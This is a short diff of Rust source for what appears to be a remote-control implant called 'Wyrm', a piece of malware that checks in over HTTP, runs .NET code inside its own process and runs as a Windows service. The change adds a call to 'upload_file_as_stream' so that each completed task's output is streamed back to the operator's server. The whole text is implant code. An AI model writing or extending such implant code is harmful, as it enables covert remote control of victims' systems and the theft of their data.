@@ -29,7 +29,7 @@ use windows_sys::{
 };
 
 use crate::{
-    comms::comms_http_check_in,
+    comms::{comms_http_check_in, upload_file_as_stream},
     entry::{APPLICATION_RUNNING, IS_IMPLANT_SVC},
     execute::dotnet::execute_dotnet_current_process,
     native::{
@@ -293,6 +293,7 @@ impl Wyrm {
                                 // Here we have the happy return path from the function which contains the
                                 // bytes serialised as a string, we just need to pass the result into the
                                 // completed task queue
+                                upload_file_as_stream(&self, &res);
                                 self.push_completed_task(&task, Some(res));
                             }
                             WyrmResult::Err(e) => {
